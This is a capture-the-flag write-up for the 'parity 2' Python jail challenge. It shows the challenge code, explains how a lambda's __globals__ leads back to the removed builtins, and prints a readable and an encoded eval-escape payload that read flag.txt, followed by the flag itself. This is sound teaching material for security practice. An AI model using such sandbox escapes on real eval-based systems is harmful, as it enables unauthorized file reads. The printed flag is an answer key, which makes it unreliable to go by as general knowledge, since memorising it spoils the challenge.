# parity 2

## Goal

Read `flag.txt` while adhering to the same parity constraints as `parity 1`, but with some changes:
- Builtin functions like `print`, `open`, and `eval` have been removed from the context
- Underscores (`_`) are "free" and don't fail the parity check
- We have access to an empty lambda function `f`

## Challenge
```py
inp = input("> ")

f = lambda: None

for i, v in enumerate(inp):
    if v == "_":
        continue
    if not (ord(v) < 128 and i % 2 == ord(v) % 2):
        print('bad')
        exit()

eval(inp, {"__builtins__": None, 'f': f})
```

## Solution

* [solve_short.py](solve/solve_short.py)
* [solve_long.py](solve/solve_long.py)
* [gen.py](solve/gen.py)
* [parity1.py](solve/parity1.py)

1. Explore `f`: We can inspect `f` using `dir(f)` to find useful attributes. One of these is `__globals__`, which contains references to all global variables, including the hidden `__builtins__`. Conveniently (and critically), the word `__globals__` also passes the parity check without modification.
2. Access `__builtins__`: Although we can't directly use `__builtins__` due to parity constraints, we can construct it character by character as a string and then retrieve it using `f.__globals__.pop('__builtins__')`.
3. Use builtins to read the flag: Once we retrieve `__builtins__`, we can access functions like `print` and `open` to read and display the flag:

### Human-Readable (Non-Encoded) Payload
```py
f.__globals__.pop("__builtins__").eval('f.__builtins__["print"](f.__builtins__["open"]("flag.txt").read())')
```

### Final Encoded Payload
Note: Tab characters aren't correctly rendered here.

```py
f	.__globals__.	pop	(	"_"+"_"+ 'b' + 	"u"	 + 	"i"	 + 'l' + 't' + 	"i"	 + 'n' + 	"s"+"_"+"_").eval	(	 'f' + '.' + 	"_"	 + 	"_"	 + 'b' + 	"u"	 + 	"i"	 + 'l' + 't' + 	"i"	 + 'n' + 	"s"	 + 	"_"	 + 	"_"	 + 	"["	 + '"' + 'p' + 'r' + 	"i"	 + 'n' + 't' + '"' + 	"]"	 + '(' + 'f' + '.' + 	"_"	 + 	"_"	 + 'b' + 	"u"	 + 	"i"	 + 'l' + 't' + 	"i"	 + 'n' + 	"s"	 + 	"_"	 + 	"_"	 + 	"["	 + '"' + 	"o"	 + 'p' + 	"e"	 + 'n' + '"' + 	"]"	 + '(' + '"' + 'f' + 'l' + 	"a"	 + 	"g"	 + '.' + 't' + 'x' + 't' + '"' + 	")"	 + '.' + 'r' + 	"e"	 + 	"a"	 + 'd' + '(' + 	")"	 + 	")")
```

## Flag

`jail{parity2_1e2e8963ea65a0333f617}`
